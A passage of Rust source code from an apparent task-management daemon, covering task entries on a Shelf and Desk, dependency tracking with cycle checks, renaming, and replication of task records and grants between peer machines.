        let text = format!("{listed}{start}{}\n", missing.join("\n"));
        fs::write(&exclude, text).map_err(|e| format!("can't write {}: {e}", exclude.display()))?;
    }
    Ok(())
}

enum Answer {
    To(Responder),
    Then(Box<dyn FnOnce(Result<Map, KmuxError>)>),
}

impl Answer {
    fn reply(self, result: Result<Map, KmuxError>) {
        match self {
            Answer::To(responder) => responder.reply(result),
            Answer::Then(then) => then(result),
        }
    }
}

struct Starting {
    entry: Entry,
    app: Option<String>,
    by: Option<String>,
    responder: Answer,
}

struct Quitting {
    agent: String,
    by: Instant,
    quit: Option<Quit>,
    hung_up: bool,
    keys: Vec<String>,
    next: Option<Instant>,
    then: Vec<Box<dyn FnOnce(Option<String>)>>,
}

#[derive(Clone, Debug)]
struct SettingUp {
    worktree: PathBuf,
    timeout: u64,
}

#[derive(Clone, Debug)]
struct TearingDown {
    entry: Entry,
    worktree: PathBuf,
    timeout: u64,
    on_shelf: bool,
    by: Option<String>,
}

const SETUP_EVERY: Duration = Duration::from_secs(1);

const QUIT_WAIT: Duration = Duration::from_secs(5);

const KEY_WAIT: Duration = Duration::from_millis(500);

const FILL_EVERY: Duration = Duration::from_secs(2);

#[derive(Clone, Debug, PartialEq)]
struct Running {
    pane: String,
    entry: Entry,
    place: Place,
}

fn alive(core: &CoreHandle, pane: &str) -> bool {
    core.pane(pane).is_some_and(|p| matches!(p.state, PaneState::Starting | PaneState::Running))
}

fn gone() -> KmuxError {
    KmuxError::new("app_gone", "the daemon is stopping")
}

pub struct Tasks {
    state: PathBuf,
    db: Rc<Db>,
    entries: RefCell<Vec<Entry>>,
    running: RefCell<Vec<Running>>,
    stopping: RefCell<HashSet<String>>,
    dirty: Cell<bool>,
    events: Sender<Event>,
    core: WeakCore,
    pending: RefCell<HashMap<u64, Starting>>,
    branching: RefCell<HashMap<u64, Box<dyn FnOnce(String)>>>,
    turns_away: RefCell<HashMap<u64, Box<dyn FnOnce()>>>,
    next: Cell<u64>,
    turns: RefCell<HashMap<String, Turn>>,
    quitting: RefCell<HashMap<String, Quitting>>,
    launching: RefCell<HashSet<String>>,
    failed: RefCell<HashSet<String>>,
    setting_up: RefCell<HashMap<String, SettingUp>>,
    tearing_down: RefCell<HashMap<String, TearingDown>>,
    keeping: RefCell<HashSet<String>>,
    fill_at: Cell<Option<Instant>>,
    waiting: RefCell<Vec<Message>>,
    ready: RefCell<HashMap<String, Ready>>,
    pub planners: RefCell<Option<Box<dyn Fn() -> Vec<String>>>>,
    pub channel: RefCell<Option<Box<dyn Fn(&str) -> Option<Channel>>>>,
    pub on_warn: RefCell<Option<Box<dyn Fn(&str, &str, &str)>>>,
    pub on_close: RefCell<Option<Box<dyn Fn(&str)>>>,
    pub permissions: RefCell<Option<Box<dyn Fn(&str) -> Option<&'static str>>>>,
    pub line_mode: RefCell<Option<Box<dyn Fn(&str) -> bool>>>,
    warned: RefCell<HashMap<String, String>>,
    delivering: RefCell<HashSet<String>>,
    posting: RefCell<HashMap<u64, (String, Vec<Message>)>>,
    pub on_change: RefCell<Option<Box<dyn Fn(Value)>>>,
    pub claimant: RefCell<String>,
    replica: RefCell<Replica>,
    pub roster: RefCell<Option<Box<dyn Fn() -> Roster>>>,
    pub exchange: RefCell<Option<Box<dyn Fn(String, Value, u64)>>>,
    pub payload: RefCell<Option<Box<dyn Fn(String, String, Value, PathBuf, u64)>>>,
    asked: RefCell<HashMap<u64, Asked>>,
    away: RefCell<HashMap<String, Away>>,
    refused: RefCell<HashMap<String, Instant>>,
    syncing: RefCell<HashSet<String>>,
    synced: RefCell<HashMap<String, Instant>>,
    woke: Cell<Instant>,
    checked: Cell<(Instant, i64)>,
    sync_at: Cell<Instant>,
    pub repos: RefCell<Option<PathBuf>>,
    importing: RefCell<Option<project_import::Import>>,
    watching: Cell<bool>,
    again: Cell<bool>,
    heads: RefCell<Option<Sender<stacks::Heads>>>,
    following: RefCell<HashSet<PathBuf>>,
    news: RefCell<News>,
    ending: RefCell<HashMap<String, Option<String>>>,
}

#[derive(Clone)]
struct Join(Rc<(Cell<usize>, RefCell<Vec<String>>, RefCell<Option<Box<dyn FnOnce(Vec<String>)>>>)>);

impl Join {
    fn new(count: usize, then: impl FnOnce(Vec<String>) + 'static) -> Join {
        let join = Join(Rc::new((Cell::new(count), RefCell::default(), RefCell::new(Some(Box::new(then))))));
        if count == 0 {
            join.finish();
        }
        join
    }

    fn done(&self, error: Option<String>) {
        self.0 .1.borrow_mut().extend(error);
        let left = self.0 .0.get().saturating_sub(1);
        self.0 .0.set(left);
        if left == 0 {
            self.finish();
        }
    }

    fn finish(&self) {
        let then = self.0 .2.borrow_mut().take();
        if let Some(then) = then {
            then(self.0 .1.take());
        }
    }
}

enum Asked {
    Sync(String),
    Ops,
    Ask { task: String, birth: String, owner: String, repo: String },
    Grant(Grant),
    Ack,
    Heads(Box<moving::Asking>),
    Packed(Box<moving::Moving>, String),
    Transfer(moving::Sending),
    Unbundled(moving::Taking),
}

const SYNC_EVERY: Duration = Duration::from_secs(3);

const AWAY_WAIT: Duration = Duration::from_secs(10);

const AWAY_MAX: Duration = Duration::from_secs(300);

const TAKEOVER_AFTER: Duration = Duration::from_secs(120);

fn takeover_after() -> Duration {
    std::env::var("KANNA_TAKEOVER_AFTER").ok().and_then(|s| s.parse().ok()).map_or(TAKEOVER_AFTER, Duration::from_secs)
}

struct Away {
    until: Instant,
    wait: Duration,
    since: Instant,
    last: Instant,
}

const REFUSED_WAIT: Duration = Duration::from_secs(10);

struct Book(Weak<Tasks>);

impl TaskBook for Book {
    fn workspace_of(&self, reference: &str) -> Option<Result<String, KmuxError>> {
        self.0.upgrade()?.workspace_of(reference)
    }

    fn task_of(&self, workspace: &str) -> Option<(String, Option<String>)> {
        self.0.upgrade()?.task_in(workspace)
    }

    fn sync(&self, workspaces: &[Value]) {
        if let Some(tasks) = self.0.upgrade() {
            tasks.sync_workspaces(workspaces);
        }
    }

    fn starting(&self, task: &str) -> bool {
        self.0.upgrade().is_some_and(|tasks| tasks.launching.borrow().contains(task))
    }
}

impl Tasks {
    pub fn open(db: Rc<Db>, state_dir: &Path, core: WeakCore, events: Sender<Event>) -> Tasks {
        let rows = db.tasks().unwrap_or_else(|error| {
            log!("kanna-daemon: can't read the tasks in {}: {error}", state_dir.join(db::FILE).display());
            vec![]
        });
        let (mut entries, mut running) = (vec![], vec![]);
        for row in &rows {
            match (row.place, &row.terminal) {
                (Place::Desk, Some(pane)) => running.push(Running { pane: pane.clone(), entry: Entry::from_row(row), place: row.place }),
                (Place::Desk, None) => {
                    let entry = Entry::from_row(row);
                    let back = Change::new("shelved").moved(row.place, Place::Shelf).by(Some("daemon"));
                    if let Err(error) = db.put(&entry.row(Place::Shelf, None), Some(&back)) {
                        log!("kanna-daemon: couldn't put {} back on the Shelf: {error}", entry.id);
                    }
                    insert_in_order(&mut entries, entry);
                }
                _ => insert_in_order(&mut entries, Entry::from_row(row)),
            }
        }
        let waiting = db.waiting_messages().unwrap_or_else(|error| {
            log!("kanna-daemon: can't read the waiting messages in {}: {error}", state_dir.join(db::FILE).display());
            vec![]
        });
        let replica = Replica::open(&db).unwrap_or_else(|error| {
            log!("kanna-daemon: can't read the replicated Shelf in {}: {error}", state_dir.join(db::FILE).display());
            Replica::empty()
        });
        Tasks {
            state: state_dir.to_path_buf(),
            db,
            entries: RefCell::new(entries),
            running: RefCell::new(running),
            stopping: RefCell::default(),
            dirty: Cell::new(true),
            events,
            core,
            pending: RefCell::default(),
            branching: RefCell::default(),
            turns_away: RefCell::default(),
            next: Cell::new(0),
            claimant: RefCell::new(MAC_APP.into()),
            turns: RefCell::default(),
            quitting: RefCell::default(),
            launching: RefCell::default(),
            failed: RefCell::default(),
            setting_up: RefCell::default(),
            tearing_down: RefCell::default(),
            keeping: RefCell::default(),
            fill_at: Cell::new(Some(Instant::now())),
            waiting: RefCell::new(waiting),
            ready: RefCell::default(),
            planners: RefCell::default(),
            channel: RefCell::default(),
            permissions: RefCell::default(),
            line_mode: RefCell::default(),
            on_warn: RefCell::default(),
            on_close: RefCell::default(),
            warned: RefCell::default(),
            delivering: RefCell::default(),
            posting: RefCell::default(),
            on_change: RefCell::default(),
            replica: RefCell::new(replica),
            roster: RefCell::default(),
            exchange: RefCell::default(),
            payload: RefCell::default(),
            asked: RefCell::default(),
            away: RefCell::default(),
            refused: RefCell::default(),
            syncing: RefCell::default(),
            synced: RefCell::default(),
            woke: Cell::new(Instant::now()),
            checked: Cell::new((Instant::now(), replica::wall())),
            sync_at: Cell::new(Instant::now()),
            repos: RefCell::default(),
            importing: RefCell::default(),
            watching: Cell::new(false),
            again: Cell::new(false),
            heads: RefCell::default(),
            following: RefCell::default(),
            news: RefCell::default(),
            ending: RefCell::default(),
        }
    }

    pub fn view(&self) -> Value {
        let tasks = self.entries.borrow().clone().iter().map(|e| self.described(e)).collect();
        let order = self.db.made_order().unwrap_or_default();
        let mut running: Vec<(usize, Entry, String)> = self.running.borrow().iter().map(|r| (order.iter().position(|id| *id == r.entry.id).unwrap_or(usize::MAX), r.entry.clone(), r.pane.clone())).collect();
        running.sort_by_key(|r| r.0);
        let desk = running
            .into_iter()
            .map(|(_, entry, pane)| {
                let mut value = json!({ "id": entry.id, "pane": pane, "madeAt": num(entry.made_at) });
                self.stack_fields(&entry, &mut value);
                value
            })
            .collect();
        json!({ "shelf": Value::Array(tasks), "desk": Value::Array(desk) })
    }

    fn workspace_of(&self, reference: &str) -> Option<Result<String, KmuxError>> {
        if reference.starts_with("ws-") || self.core.upgrade().is_some_and(|core| core.pane(reference).is_some()) {
            return None;
        }
        match self.resolve(reference) {
            Err(error) => Some(Err(error)),
            Ok(None) => None,
            Ok(Some(id)) => Some(
                self.open_tasks().into_iter().find(|e| e.id == id).and_then(|e| e.workspace).ok_or_else(|| KmuxError::new("not_started", format!("{} hasn't started, so it has no workspace yet", self.short(&id)))),
            ),
        }
    }

    fn task_in(&self, workspace: &str) -> Option<(String, Option<String>)> {
        let named = |e: &Entry| (e.id.clone(), e.name.clone());
        let running = self.running.try_borrow().ok()?.iter().find(|r| r.entry.workspace.as_deref() == Some(workspace)).map(|r| named(&r.entry));
        running.or_else(|| self.entries.try_borrow().ok()?.iter().find(|e| e.workspace.as_deref() == Some(workspace)).map(named))
    }

    fn sync_workspaces(&self, workspaces: &[Value]) {
        let of = |pane: &str| workspaces.iter().find(|w| w["dock"]["id"] == pane).and_then(|w| string(w, "id")).map(String::from);
        let mut moved = vec![];
        if let Ok(mut running) = self.running.try_borrow_mut() {
            for r in running.iter_mut() {
                if let Some(ws) = of(&r.pane).filter(|ws| r.entry.workspace.as_ref() != Some(ws)) {
                    r.entry.workspace = Some(ws);
                    moved.push((r.entry.clone(), r.place, r.pane.clone()));
                }
            }
        }
        if let Ok(mut entries) = self.entries.try_borrow_mut() {
            for e in entries.iter_mut() {
                let Some(pane) = e.held.clone() else { continue };
                if let Some(ws) = of(&pane).filter(|ws| e.workspace.as_ref() != Some(ws)) {
                    e.workspace = Some(ws);
                    moved.push((e.clone(), Place::Shelf, pane));
                }
            }
        }
        for (entry, place, pane) in moved {
            let _ = self.store(&entry, place, Some(&pane), None);
        }
    }

    fn open_tasks(&self) -> Vec<Entry> {
        self.entries.borrow().iter().cloned().chain(self.running.borrow().iter().map(|r| r.entry.clone())).collect()
    }

    fn resolve(&self, reference: &str) -> Result<Option<String>, KmuxError> {
        if self.is_open(reference) {
            return Ok(Some(reference.to_string()));
        }
        if let Some(pane) = self.core.upgrade().and_then(|core| core.pane(reference)) {
            return Ok(self.task_of(&pane.id));
        }
        let start = reference.to_lowercase();
        let start = start.strip_prefix(db::TASK).unwrap_or(&start);
        if !start.is_empty() && start.len() <= 8 && start.bytes().all(|b| b.is_ascii_hexdigit()) {
            let found: Vec<Entry> = self.open_tasks().into_iter().filter(|e| e.id.strip_prefix(db::TASK).is_some_and(|hex| hex.starts_with(start))).collect();
            match found.as_slice() {
                [] => {}
                [one] => return Ok(Some(one.id.clone())),
                many => {
                    let named: Vec<String> = many.iter().map(|e| self.label(&e.id)).collect();
                    return Err(KmuxError::new("ambiguous", format!("{reference} could be {} tasks: {}; say more of its ID", many.len(), named.join(", "))));
                }
            }
        }
        if let Some(row) = self.db.task(reference).ok().flatten() {
            return Ok(Some(row.id));
        }
        let replica = self.replica.borrow();
        let elsewhere: Vec<String> = replica.records().filter(|r| r.text("state").is_some_and(|s| s != "done")).map(|r| r.task.clone()).filter(|id| id == reference || (!start.is_empty() && id.strip_prefix(db::TASK).is_some_and(|hex| hex.starts_with(start)))).collect();
        Ok(match elsewhere.as_slice() {
            [one] => Some(one.clone()),
            _ => None,
        })
    }

    pub fn agent(&self, reference: &str, then: impl FnOnce(Result<String, KmuxError>) + 'static) {
        let Some(core) = self.core.upgrade() else { return then(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let task = match self.resolve(reference) {
            Ok(Some(id)) => self.pane_or(&id),
            Ok(None) => reference.to_string(),
            Err(error) => return then(Err(error)),
        };
        core.handle(json!({ "cmd": "task", "args": { "action": "find", "task": task } }), move |reply| match failed(&reply) {
            Some(error) => then(Err(error)),
            None => then(Ok(string(&reply, "task").unwrap_or_default().to_string())),
        });
    }

    pub fn about(&self, reference: &str) -> Result<(String, Option<String>, Option<String>), KmuxError> {
        let id = self.resolve(reference)?.ok_or_else(|| KmuxError::new("not_found", format!("no task \"{reference}\"")))?;
        let running = self.running.borrow().iter().find(|r| r.entry.id == id).map(|r| r.pane.clone());
        let pane = running.or_else(|| self.entries.borrow().iter().find(|e| e.id == id).and_then(|e| e.held.clone()));
        Ok((id.clone(), self.known(&id).and_then(|e| e.name), pane))
    }

    fn short(&self, id: &str) -> String {
        let (entries, running) = (self.entries.borrow(), self.running.borrow());
        db::short_id(id, entries.iter().map(|e| e.id.as_str()).chain(running.iter().map(|r| r.entry.id.as_str())))
    }

    fn pane_or(&self, reference: &str) -> String {
        self.running.borrow().iter().find(|r| r.entry.id == reference).map_or_else(|| reference.to_string(), |r| r.pane.clone())
    }

    fn is_open(&self, id: &str) -> bool {
        self.entries.borrow().iter().any(|e| e.id == id) || self.running.borrow().iter().any(|r| r.entry.id == id)
    }

    fn known(&self, id: &str) -> Option<Entry> {
        let waiting = self.entries.borrow().iter().find(|e| e.id == id).cloned();
        let running = || self.running.borrow().iter().find(|r| r.entry.id == id).map(|r| r.entry.clone());
        waiting.or_else(running).or_else(|| self.db.task(id).ok().flatten().map(|row| Entry::from_row(&row)))
    }

    fn pane_of(&self, id: &str) -> Option<String> {
        let running = self.running.borrow().iter().find(|r| r.entry.id == id).map(|r| r.pane.clone());
        running.or_else(|| self.entries.borrow().iter().find(|e| e.id == id).and_then(|e| e.held.clone()))
    }

    fn waits(&self, entry: &Entry) -> Vec<String> {
        if entry.folder.is_some() {
            return vec![];
        }
        let open = self.open_tasks();
        entry.after.iter().filter(|id| open.iter().any(|e| e.id == **id && (e.ready.is_none() || !e.stale.is_empty())) || (!self.is_open(id) && self.replica.borrow().open_task(id))).cloned().collect()
    }

    fn ambiguous(&self, id: &str) -> bool {
        self.replica.borrow().births(id).len() > 1
    }

    fn open_anywhere(&self, id: &str) -> bool {
        self.is_open(id) || self.replica.borrow().open_task(id)
    }

    fn stack_of(&self, entry: &Entry) -> Vec<Base> {
        entry.after.iter().filter_map(|id| self.known(id)).filter_map(|e| e.ready.map(|mark| Base { id: e.id, branch: mark.branch, head: mark.head })).collect()
    }

    fn conflicted(&self, entry: &Entry) -> Option<String> {
        let conflict = entry.conflict.as_ref()?;
        let heads: Vec<String> = self.stack_of(entry).into_iter().map(|b| b.head).collect();
        (heads == conflict.heads && entry.folder.is_none()).then(|| conflict.why.clone())
    }

    fn label(&self, id: &str) -> String {
        let elsewhere = || self.replica.borrow().births(id).first().and_then(|r| r.text("name").map(String::from));
        match self.known(id).and_then(|e| e.name).or_else(elsewhere) {
            Some(name) => format!("{} \"{name}\"", self.short(id)),
            None => self.short(id),
        }
    }

    fn waits_for(&self, from: &str, target: &str) -> bool {
        let mut seen = HashSet::new();
        let mut todo = vec![from.to_string()];
        while let Some(id) = todo.pop() {
            if !seen.insert(id.clone()) {
                continue;
            }
            let here = self.entries.borrow().iter().find(|e| e.id == id).map(|e| e.after.clone());
            let after = here.unwrap_or_else(|| self.replica.borrow().births(&id).iter().flat_map(|r| r.list("after")).collect());
            if after.iter().any(|next| next == target) {
                return true;
            }
            todo.extend(after);
        }
        false
    }

    fn described(&self, entry: &Entry) -> Value {
        let mut value = entry.to_value();
        value["short"] = json!(self.short(&entry.id));
        let running = entry.held.as_deref().zip(self.core.upgrade()).is_some_and(|(pane, core)| alive(&core, pane));
        value["running"] = json!(running);
        value["script"] = opt(self.script_said(entry, entry.held.as_deref(), running).as_deref());
        let waits = self.waits(entry).iter().map(|id| json!({ "id": id, "name": opt(self.known(id).and_then(|e| e.name).as_deref()), "pane": opt(self.pane_of(id).as_deref()) })).collect();
        value["waits"] = Value::Array(waits);
        self.stack_fields(entry, &mut value);
        value["branch"] = opt(entry.folder.as_deref().and_then(branch_of).as_deref());
        value["project"] = opt(identity(&entry.repo).as_deref());
        value
    }

    fn blockers(&self, args: &Value, me: &str) -> Result<Option<Vec<String>>, KmuxError> {
        Ok(match args.get("after") {
            None | Some(Value::Null) => None,
            Some(Value::Array(list)) => {
                let mut ids: Vec<String> = vec![];
                for reference in list.iter().filter_map(Value::as_str) {
                    let id = self.resolve(reference)?.ok_or_else(|| not_found(reference))?;
                    if !self.open_anywhere(&id) {
                        return Err(bad(format!("{} is done already, so there's nothing to wait for", self.short(reference))));
                    }
                    if id == me || self.waits_for(&id, me) {
                        return Err(KmuxError::new("cycle", format!("{} waits for {}: they'd wait for each other", self.short(reference), self.short(me))));
                    }
                    if !ids.contains(&id) {
                        ids.push(id);
                    }
                }
                Some(ids)
            }
            Some(_) => return Err(bad("after is a list of tasks")),
        })
    }

    fn placed(&self, repo: &str) -> Result<(), KmuxError> {
        if let Some(importing) = self.importing.borrow().as_ref().filter(|m| m.holds(repo)) {
            return Err(KmuxError::new("importing", format!("{} is being imported to {}: try again once it's there", crate::projects::tilde(&importing.from), crate::projects::tilde(&importing.to))));
        }
        match self.repos.borrow().as_deref() {
            Some(repos) => crate::projects::outside(repos, Path::new(repo)),
            None => Ok(()),
        }
    }

    fn startable(&self, entry: &Entry) -> Result<(), KmuxError> {
        self.placed(&entry.repo)?;
        if let Some(to) = self.moving_to(&entry.id) {
            return Err(KmuxError::new("moving", format!("{} is moving to {to}: it carries on there", self.short(&entry.id))));
        }
        if entry.folder.is_some() || entry.held.is_some() {
            return Ok(());
        }
        let waits = self.waits(entry);
        if !waits.is_empty() {
            let names: Vec<String> = waits.iter().map(|id| self.label(id)).collect();
            let them = if waits.len() > 1 { "they're" } else { "it's" };
            return Err(KmuxError::new("blocked", format!("{} waits for {}: it can start once {them} ready or done", self.short(&entry.id), names.join(", "))));
        }
        if let Some(why) = self.conflicted(entry) {
            return Err(KmuxError::new("blocked", format!("{} stays blocked: {why}; it tries again when one of them is ready at a new head", self.short(&entry.id))));
        }
        Ok(())
    }

    fn edit(&self, args: &Value) -> Result<Map, KmuxError> {
        let reference = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let Some(mut entry) = self.entries.borrow().iter().find(|e| e.id == reference).cloned() else {
            return Err(KmuxError::new("not_found", format!("no Shelf task \"{reference}\"")));
        };
        if entry.folder.is_some() {
            return Err(KmuxError::new("started", format!("{} has started: its branch is made, and nothing holds it back now", self.short(reference))));
        }
        entry.after = self.blockers(args, &entry.id)?.ok_or_else(|| bad("say what it waits for: after"))?;
        let change = Change::new("edited").by(who(args)).with("after", json!(entry.after));
        self.store(&entry, Place::Shelf, entry.held.as_deref(), Some(change))?;
        let value = self.described(&entry);
        if let Some(found) = self.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
            *found = entry;
        }
        self.changed();
        self.refill();
        Ok(Map::from_iter([("task".to_string(), value)]))
    }

    fn name(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let Some(reference) = string(args, "task") else { return responder.reply(Err(bad("say which task"))) };
        let Some(name) = string(args, "name").map(str::trim).filter(|n| !n.is_empty()).map(String::from) else { return responder.reply(Err(bad("a task needs a name"))) };
        let waiting = self.entries.borrow().iter().find(|e| e.id == reference).cloned();
        let Some(entry) = waiting else {
            let running = self.running.borrow().iter().find(|r| r.entry.id == reference).map(|r| r.pane.clone());
            let Some(pane) = running else { return responder.reply(Err(KmuxError::new("not_found", format!("no task \"{reference}\" on the Shelf or on the Desk")))) };
            let id = reference.to_string();
            return core.handle(json!({ "cmd": "rename-pane", "args": { "pane": pane, "name": name } }), move |reply| match failed(&reply) {
                Some(error) => responder.reply(Err(error)),
                None => responder.reply(Ok(Map::from_iter([("task".to_string(), json!({ "id": id, "name": name, "pane": pane }))]))),
            });
        };
        let (by, label, held) = (who(args).map(String::from), name.clone(), entry.held.clone().filter(|pane| core.pane(pane).is_some()));
        let this = Rc::downgrade(self);
        let rename = move |reply: Value| {
            let Some(this) = this.upgrade() else { return };
            if let Some(error) = failed(&reply) {
                return responder.reply(Err(error));
            }
            let old = entry.name.clone();
            let entry = Entry { name: Some(name), ..entry };
            let change = Change::new("renamed").by(by.as_deref()).with("from", opt(old.as_deref()));
            if let Err(error) = this.store(&entry, Place::Shelf, entry.held.as_deref(), Some(change)) {
                return responder.reply(Err(error));
            }
            let value = this.described(&entry);
            if let Some(found) = this.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
                found.name = entry.name.clone();
            }
            this.changed();
            responder.reply(Ok(Map::from_iter([("task".to_string(), value)])));
        };
        match held {
            Some(pane) => core.handle(json!({ "cmd": "rename-pane", "args": { "pane": pane, "name": label } }), rename),
            None => rename(json!({ "ok": true })),
        }
    }

    fn store(&self, entry: &Entry, place: Place, pane: Option<&str>, change: Option<Change>) -> Result<(), KmuxError> {
        let staged = self.stage(entry, place);
        let mut replica = self.replica.borrow_mut();
        let saved = self.db.put_with(&entry.row(place, pane), change.as_ref(), |conn| match &staged {
            Some((birth, ops, permit)) => {
                replica.commit(conn, ops)?;
                match permit {
                    Some(permit) => replica::hold_unless_held(conn, &entry.id, birth, *permit),
                    None => Ok(()),
                }
            }
            None => Ok(()),
        });
        saved.map_err(|error| {
            log!("kanna-daemon: couldn't save {} in {}: {error}", entry.id, db::FILE);
            KmuxError::new("failed", format!("couldn't save {}: {error}", entry.id))
        })?;
        if let Some((_, ops, _)) = staged.filter(|(_, ops, _)| !ops.is_empty()) {
            replica.applied(&ops);
            self.sync_at.set(Instant::now());
        }
        Ok(())
    }

    fn machines(&self) -> Roster {
        self.roster.borrow().as_ref().map(|roster| roster()).unwrap_or_default()
    }

    /// Joins the replicated Shelf as this machine: its tasks' records are published, with permission to start the ones it holds.
    pub fn join(&self) {
        let me = self.machines().me;
        self.replica.borrow_mut().set_device(if me.key.is_empty() { "this" } else { &me.key });
        let mut held: Vec<(Entry, Place, Option<String>)> = self.entries.borrow().iter().map(|e| (e.clone(), Place::Shelf, e.held.clone())).collect();
        held.extend(self.running.borrow().iter().map(|r| (r.entry.clone(), r.place, Some(r.pane.clone()))));
        for (mut entry, place, pane) in held {
            if entry.birth.is_some() {
                let _ = self.store(&entry, place, pane.as_deref(), None);
                continue;
            }
            entry.birth = Some(Hlc { ms: (entry.made_at * 1000.0) as i64, n: 0, device: self.replica.borrow().me().to_string() }.text());
            if self.store(&entry, place, pane.as_deref(), None).is_ok() {
                for e in self.entries.borrow_mut().iter_mut().filter(|e| e.id == entry.id) {
                    e.birth = entry.birth.clone();
                }
                for r in self.running.borrow_mut().iter_mut().filter(|r| r.entry.id == entry.id) {
                    r.entry.birth = entry.birth.clone();
                }
            }
        }
    }

    /// The record writes that say what a task held here is now, and the permission to take if this machine has none for it yet.
    fn stage(&self, entry: &Entry, place: Place) -> Option<(String, Vec<replica::Op>, Option<Permit>)> {
        let birth = entry.birth.clone()?;
        let mut replica = self.replica.borrow_mut();
        if replica.me().is_empty() {
            return None;
        }
        let started = entry.folder.is_some() || entry.held.is_some() || place != Place::Shelf;
        let state = match place {
            Place::Done => "done",
            _ if started => "started",
            _ => "waiting",
        };
        let permit = (place != Place::Done).then_some(if started { Permit::Running } else { Permit::Ready });
        let me = replica.me().to_string();
        let fields = [
            ("project", opt(identity(&entry.repo).as_deref())),
            ("name", opt(entry.name.as_deref())),
            ("message", opt(entry.message.as_deref())),
            ("agent", json!(entry.agent)),
            ("after", json!(entry.after)),
            ("on", json!(entry.on)),
            ("state", json!(state)),
            ("owner", json!(me)),
        ];
        let ops = replica.stage(&entry.id, &birth, &fields);
        Some((birth, ops, permit))
    }

    fn clones(&self) -> Vec<String> {
        let mut repos: Vec<String> = self.entries.borrow().iter().map(|e| e.repo.clone()).collect();
        repos.extend(self.running.borrow().iter().map(|r| r.entry.repo.clone()));
        repos.extend(self.db.projects().unwrap_or_default().into_iter().map(|(path, _)| path).filter(|path| Path::new(path).is_dir()));
        let kept = self.repos.borrow().clone().and_then(|folder| fs::read_dir(folder).ok());
        for owner in kept.into_iter().flatten().flatten() {
            let named = fs::read_dir(owner.path()).into_iter().flatten().flatten();
            repos.extend(named.map(|repo| repo.path()).filter(|path| path.join(".git").exists()).map(|path| path.to_string_lossy().into_owned()));
        }
        repos.sort();
        repos.dedup();
        repos
    }

    fn clone_of(&self, project: &str) -> Option<String> {
        self.clones().into_iter().find(|repo| identity(repo).as_deref() == Some(project))
    }

    /// Takes the tasks granted to this machine onto its Shelf, in the clone of their project here.
    fn adopt(&self) {
        let Ok(held) = Replica::held(&self.db) else { return };
        let mut adopted = false;
        for (task, birth, _) in held.into_iter().filter(|(_, _, a)| a.permit == Permit::Ready) {
            if self.is_open(&task) {
                continue;
            }
            let Some(record) = self.replica.borrow().record(&task, &birth).cloned() else { continue };
            if record.text("state") != Some("waiting") {
                continue;
            }
            let Some(repo) = record.text("project").and_then(|project| self.clone_of(project)) else {
                log!("kanna-daemon: {task} was granted here, but this machine has no clone of {}", record.text("project").unwrap_or("its project"));
                continue;
            };
            let entry = Entry {
                id: task.clone(),
                name: record.text("name").map(String::from),
                message: record.text("message").map(String::from),
                repo,
                made_at: record.born().ms as f64 / 1000.0,
                agent: record.text("agent").unwrap_or(DEFAULT_AGENT).to_string(),
                after: record.list("after"),
                on: record.list("on"),
                birth: Some(birth),
                ..Default::default()
            };
            let me = self.replica.borrow().me().to_string();
            let change = match record.get(&format!("{}{me}", replica::RUN))["from"].as_str() {
                Some(from) => Change::new("taken").with("from", json!(self.machines().name_of(from))),
                None => Change::new("granted"),
            };
            if self.store(&entry, Place::Shelf, None, Some(Change { to: Some(Place::Shelf), ..change }.by(Some("daemon")))).is_ok() {
                log!("kanna-daemon: {task} is on this machine's Shelf now, in {}", entry.repo);
                self.entries.borrow_mut().push(entry);
                adopted = true;
            }
        }
        if adopted {
            self.changed();
        }
    }

    fn send_to(&self, peer: &str, args: Value, asked: Asked) {
        let token = self.next.get() + 1;
        self.next.set(token);
        self.asked.borrow_mut().insert(token, asked);
        match self.exchange.borrow().as_ref() {
            Some(exchange) => exchange(peer.to_string(), json!({ "id": 1, "cmd": "replica", "args": args }), token),
            None => {
                self.asked.borrow_mut().remove(&token);
            }
        }
    }

    fn is_away(&self, peer: &str, now: Instant) -> bool {
        self.away.borrow().get(peer).is_some_and(|away| away.until > now)
    }

    fn went_away(&self, peer: String) {
        let now = Instant::now();
        let (wait, since) = self.away.borrow().get(&peer).map_or((AWAY_WAIT, now), |away| ((away.wait * 2).min(AWAY_MAX), away.since));
        self.away.borrow_mut().insert(peer, Away { until: now + wait, wait, since, last: now });
    }

    fn away_long(&self, peer: &str, now: Instant) -> bool {
        self.away.borrow().get(peer).is_some_and(|away| now.duration_since(away.since) >= takeover_after())
    }

    fn heard_from_all(&self, machines: &Roster) -> bool {
        let (now, wall) = (Instant::now(), replica::wall());
        let (then, then_wall) = self.checked.replace((now, wall));
        if wall - then_wall > now.duration_since(then).as_millis() as i64 + 30_000 {
            self.woke.set(now);
        }
        let woke = self.woke.get();
        let (synced, away) = (self.synced.borrow(), self.away.borrow());
        machines.peers.iter().all(|p| synced.get(&p.key).is_some_and(|at| *at >= woke) || away.get(&p.key).is_some_and(|a| a.last >= woke))
    }

    fn came_back(&self, peer: &str) {
        self.away.borrow_mut().remove(peer);
    }

    fn sync_all(&self) {
        let machines = self.machines();
        let now = Instant::now();
        let vector = self.replica.borrow().vector();
        for peer in &machines.peers {
            if self.syncing.borrow().contains(&peer.key) || self.is_away(&peer.key, now) {
                continue;
            }
            self.syncing.borrow_mut().insert(peer.key.clone());
            self.send_to(&peer.key, json!({ "action": "sync", "vector": vector }), Asked::Sync(peer.key.clone()));
        }
        self.resend_transfers();
        let sending: HashSet<String> = self.asked.borrow().values().filter_map(|a| if let Asked::Grant(g) = a { Some(g.task.clone()) } else { None }).collect();
        for grant in Replica::outbox(&self.db).unwrap_or_default() {
            if !sending.contains(&grant.task) && machines.peers.iter().any(|p| p.key == grant.to) {
                let args = json!({ "action": "grant", "task": grant.task, "birth": grant.birth, "epoch": grant.epoch });
                self.send_to(&grant.to.clone(), args, Asked::Grant(grant));
            }
        }
    }

    pub fn replied(self: &Rc<Self>, token: u64, reply: Result<Value, String>) {
        let Some(asked) = self.asked.borrow_mut().remove(&token) else { return };
        let asked = match asked {
            Asked::Packed(moving, id) => return self.packed(*moving, id, reply),
            Asked::Unbundled(taking) => return self.unbundled(taking, reply),
            other => other,
        };
